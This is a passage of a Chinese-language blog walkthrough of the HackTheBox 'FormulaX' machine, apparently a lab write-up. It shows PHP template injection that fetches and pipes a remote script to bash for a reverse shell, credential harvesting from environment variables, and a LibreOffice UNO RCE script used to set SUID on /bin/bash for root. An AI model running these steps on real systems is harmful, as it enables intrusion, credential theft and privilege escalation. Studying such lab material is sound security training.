<p>登录成功，但是打开控制台显示错误，这里是域名的问题，我们去添加一个hosts解析</p>
<pre><code>echo &quot;127.0.0.1 librenms.com&quot; &gt;&gt; /etc/hosts 
</code></pre>
<p>在<code>http://librenms.com:3000/templates</code>路径下，看到有一些模块，尝试修改可以看到是一些php格式的代码</p>
<img src="/2024/03/10/Hackthebox/Hard/FormulaX/image-20240312151912248.png" class title="image-20240312151912248">

<p>我们尝试修改内容试试，还是本地用python3开启一个http服务</p>
<pre><code>@php
system(&quot;curl http://10.10.16.23/&quot;);
@endphp
</code></pre>
<pre><code> lucifiel@MacBookPro  ~  python3 -m http.server 80
Serving HTTP on :: port 80 (http://[::]:80/) ...
::ffff:10.10.11.6 - - [12/Mar/2024 15:20:18] &quot;GET / HTTP/1.1&quot; 200 -
</code></pre>
<p>成功执行了命令，那我们去反弹geshell</p>
<pre><code>@php
system(&quot;curl http://10.10.16.23/shell.sh|bash &gt;&amp;2&quot;);
@endphp
</code></pre>
<pre><code> lucifiel@MacBookPro  ~  nc -nvlp 4444
Connection from 10.10.11.6:56966
bash: cannot set terminal process group (939): Inappropriate ioctl for device
bash: no job control in this shell
librenms@formulax:~$ whoami&amp;&amp;id
whoami&amp;&amp;id
librenms
uid=999(librenms) gid=999(librenms) groups=999(librenms)
</code></pre>
<p>成功提权到 librenms 账户</p>
<h2 id="kai-relay"><a href="#kai-relay" class="headerlink" title="kai_relay"></a>kai_relay</h2><pre><code>librenms@formulax:~$ env
env
DB_PASSWORD=mychemicalformulaX
PWD=/opt/librenms
NODE_ID=648b260eb18d2
HOME=/opt/librenms
APP_KEY=base64:jRoDTOFGZEO08+68w7EzYPp8a7KZCNk+4Fhh97lnCEk=
DB_USERNAME=kai_relay
DB_HOST=localhost
USER=librenms
SHLVL=2
VAPID_PRIVATE_KEY=chr9zlPVQT8NsYgDGeVFda-AiD0UWIY6OW-jStiwmTQ
DB_DATABASE=librenms
VAPID_PUBLIC_KEY=BDhe6thQfwA7elEUvyMPh9CEtrWZM1ySaMMIaB10DsIhGeQ8Iks8kL6uLtjMsHe61-ZCC6f6XgPVt7O6liSqpvg
_=/usr/bin/env
</code></pre>
<p>直接使用env查看环境变量，拿到了一个密码，猜测应该是kai_relay的</p>
<pre><code>username = kai_relay
password = mychemicalformulaX
</code></pre>
<pre><code> lucifiel@MacBookPro  ~  ssh kai_relay@10.10.11.6
kai_relay@10.10.11.6&#39;s password:
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-97-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the &#39;unminimize&#39; command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

kai_relay@formulax:~$ whoami&amp;&amp;id
kai_relay
uid=1001(kai_relay) gid=1001(kai_relay) groups=1001(kai_relay),27(sudo),999(librenms)
</code></pre>
<p>成功提权到 kai_relay</p>
<h2 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h2><pre><code>kai_relay@formulax:~$ sudo -l
Matching Defaults entries for kai_relay on forumlax:
    env_reset, timestamp_timeout=0, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty,
    env_reset, timestamp_timeout=0

User kai_relay may run the following commands on forumlax:
    (ALL) NOPASSWD: /usr/bin/office.sh
</code></pre>
<p>sudo -l查看一下，发现可以使用 root 权限执行 &#x2F;usr&#x2F;bin&#x2F;office.sh 文件</p>
<pre><code>kai_relay@formulax:~$ cat /usr/bin/office.sh
#!/bin/bash
/usr/bin/soffice --calc --accept=&quot;socket,host=localhost,port=2002;urp;&quot; --norestore --nologo --nodefault --headless
</code></pre>
<p>发现会使用 socket 协议开启一个 2002 的端口，去尝试执行一下</p>
<pre><code>kai_relay@formulax:~$ nc -v localhost 2002
Connection to localhost (127.0.0.1) 2002 port [tcp/*] succeeded!
e��&#39;com.sun.star.bridge.XProtocolPropertiesUrpProtocolProperties.UrpProtocolPropertiesTid:�F
</code></pre>
<p>去访问2002端口得到了一个不知道什么东西的，去google一下</p>
<blockquote>
<p><a href="https://stackoverflow.com/questions/73487041/tcp-send-at-uno-openoffice-command-by-telnet-or-netcat" target="_blank" rel="noopener">https://stackoverflow.com/questions/73487041/tcp-send-at-uno-openoffice-command-by-telnet-or-netcat</a></p>
</blockquote>
<p>这偏提问让我们知道了这是一个uno</p>
<blockquote>
<p><a href="https://github.com/sud0woodo/ApacheUNO-RCE" target="_blank" rel="noopener">https://github.com/sud0woodo/ApacheUNO-RCE</a></p>
</blockquote>
<p>然后找到了一个 rce的poc</p>
<pre><code>import uno
from com.sun.star.system import XSystemShellExecute
import argparse

parser = argparse.ArgumentParser()
parser.add_argument(&#39;--host&#39;, help=&#39;host to connect to&#39;, dest=&#39;host&#39;, required=True)
parser.add_argument(&#39;--port&#39;, help=&#39;port to connect to&#39;, dest=&#39;port&#39;, required=True)

args = parser.parse_args()
# Define the UNO component
localContext = uno.getComponentContext()
# Define the resolver to use, this is used to connect with the API
resolver = localContext.ServiceManager.createInstanceWithContext(
                &quot;com.sun.star.bridge.UnoUrlResolver&quot;, localContext )
# Connect with the provided host on the provided target port
print(&quot;[+] Connecting to target...&quot;)
context = resolver.resolve(
    &quot;uno:socket,host={0},port={1};urp;StarOffice.ComponentContext&quot;.format(args.host,args.port))
# Issue the service manager to spawn the SystemShellExecute module and execute calc.exe
service_manager = context.ServiceManager
print(&quot;[+] Connected to {0}&quot;.format(args.host))
shell_execute = service_manager.createInstance(&quot;com.sun.star.system.SystemShellExecute&quot;)
shell_execute.execute(&quot;/home/kai_relay/rce.sh&quot;, &#39;&#39;,1)
</code></pre>
<p>再在本地写一个脚本</p>
<pre><code>#!/bin/bash
chmod +s /bin/bash
</code></pre>
<pre><code>kai_relay@formulax:~$ python3 rce.py --host localhost --port 2002
[+] Connecting to target...
[+] Connected to localhost
kai_relay@formulax:~$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1396520 Jan  6  2022 /bin/bash
</code></pre>
<pre><code>kai_relay@formulax:~$ /bin/bash -p
bash-5.1# whoami&amp;&amp;id
root
uid=1001(kai_relay) gid=1001(kai_relay) euid=0(root) egid=0(root) groups=0(root),27(sudo),999(librenms),1001(kai_relay)
</code></pre>
<p>成功提权到 root</p>
<pre><code>bash-5.1# cat /root/root.txt
e0ee14fe1b428445afd2794c61d932d8
</code></pre>
<p>成功获得了 root 权限的 flag 文件</p>
<img src="/2024/03/10/Hackthebox/Hard/FormulaX/image-20240312103136310.png" class title="image-20240312103136310">

        </div>

        <blockquote class="post-copyright">
    
    <footer>
        <a href="http://www.lucifiel.com">
            <img src="/img/avatar.jpg" alt="Lucifiel">
            Lucifiel
        </a>
    </footer>
</blockquote>

        


        <div class="post-footer">
            
	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>


            
<div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2024/03/10/Hackthebox/Hard/FormulaX/&title=《FormulaX - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2024/03/10/Hackthebox/Hard/FormulaX/&title=《FormulaX - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2024/03/10/Hackthebox/Hard/FormulaX/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《FormulaX - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2024/03/10/Hackthebox/Hard/FormulaX/&via=http://www.lucifiel.com" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2024/03/10/Hackthebox/Hard/FormulaX/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>



        </div>
    </div>

    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="waves-block waves-effect prev">
      <a href="/2024/03/17/Hackthebox/Medium/WifineticTwo/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">WifineticTwo - Hackthebox</h4>
      </a>
    </div>
  

  
    <div class="waves-block waves-effect next">
      <a href="/2024/03/03/Hackthebox/Easy/Perfection/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">Perfection - Hackthebox</h4>
      </a>
    </div>
  
</nav>



    

















<section class="comments" id="comments">
    <div id="gitalk-container"></div>
    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
    <script>
        var id = location.pathname
        if (location.pathname.length > 50) {
          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
        }
        const gitalk = new Gitalk({
          clientID: 'cf0a9809323df14a9168',
          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
          repo: 'LucifielHack.github.io',
          owner: 'LucifielHack',
          admin: ['LucifielHack'],
          id: id,      // Ensure uniqueness and length less than 50
          title: document.title.split('|')[0],
          distractionFreeMode: false  // Facebook-like distraction free mode
        })

        gitalk.render('gitalk-container')
    </script>
</section>




</article>



</div>

        <footer class="footer">
    <div class="top">
        
<p>
    <span id="busuanzi_container_site_uv" style='display:none'>
        站点总访客数：<span id="busuanzi_value_site_uv"></span>
    </span>
    <span id="busuanzi_container_site_pv" style='display:none'>
        站点总访问量：<span id="busuanzi_value_site_pv"></span>
    </span>
</p>


        <p>
            <!--- 
                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
            
            <span>footer.license</span> --->
        </p>
    </div>
    <div class="bottom">
        <p><span>Lucifiel &copy; 2020 - 2025</span>
            <span>
                
                Power by Lucifiel</a>
            </span>
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2024/03/10/Hackthebox/Hard/FormulaX/&title=《FormulaX - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2024/03/10/Hackthebox/Hard/FormulaX/&title=《FormulaX - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2024/03/10/Hackthebox/Hard/FormulaX/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《FormulaX - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2024/03/10/Hackthebox/Hard/FormulaX/&via=http://www.lucifiel.com" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2024/03/10/Hackthebox/Hard/FormulaX/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACH0lEQVR42u3aO3LDMAwFQN//0k7rIqYfANkzIpeVRpFCrwoMPnw84vV8Wa938ufz/7l+a7QwMDBuy3guV4+Rw/J93z2DgYFxDuPdxuvrd3/NP0HCWP82DAwMjMl1HjoxMDAwrmWs7+RhOsdjYGBg9ALfOphWu2E/rcUxMDBuyMibZb+//sp8AwMD41aMbxSWk8Hks7UwMDD2ZuQBbp2WJWlikt71wBgYGKcxJsXqpKzNW3jl7BUDA+PmjGpzrXeoq7pjeUSKgYFxAKN6bCJ/ppd65u9iYGCcwKiOCauYSeu/2tTDwMDYlVE9VNFrrk0OgUUHLDAwMA5gVF+7qsTN3/3wQTEwMA5gVLepNtEKM4q4xI3OjGBgYBzA6LX18zZZLyUtVOEYGBhbMHpt/TwFrHb+JqMFDAyM0xjVBDEZf/Yac4XBKgYGxtaMXhCcA/K3mvUuBgbGFozcmgTKKrhw5Gt9HwMDY2vGJKROBp95wpenkhgYGCcw8oBYHQPkQ4j8wNk/+2JgYBzD6IW/SVF62UE0DAyMAxh52VkN0POmXvQMBgbGpoxncVWbZdWDF5clhRgYGBsxegPO3p1khDlpzGFgYOzNyINsNfBVw+4ofcTAwDiAUR1e9kaVkyL2Q3sOAwMDY9Aa641Co2HA/LtiYGAcw8jD6GQkEBWxGBgYWzN6w4Br7/RGoRgYGCcw8tKxGhALJWjwEyelLwYGxm0Zf0l1slCDaz40AAAAAElFTkSuQmCC" alt="微信分享二维码">
</div>




    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
<script>
var BLOG = { ROOT: '/', SHARE: true, REWARD: false };


</script>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>


<div class="search-panel" id="search-panel">
    <ul class="search-result" id="search-result"></ul>
</div>
<template id="search-tpl">
<li class="item">
    <a href="{path}" class="waves-block waves-effect">
        <div class="title ellipsis" title="{title}">{title}</div>
        <div class="flex-row flex-middle">
            <div class="tags ellipsis">
                {tags}
            </div>
            <time class="flex-col time">{date}</time>
        </div>
    </a>
</li>
</template>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>






<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->





</body>
</html>
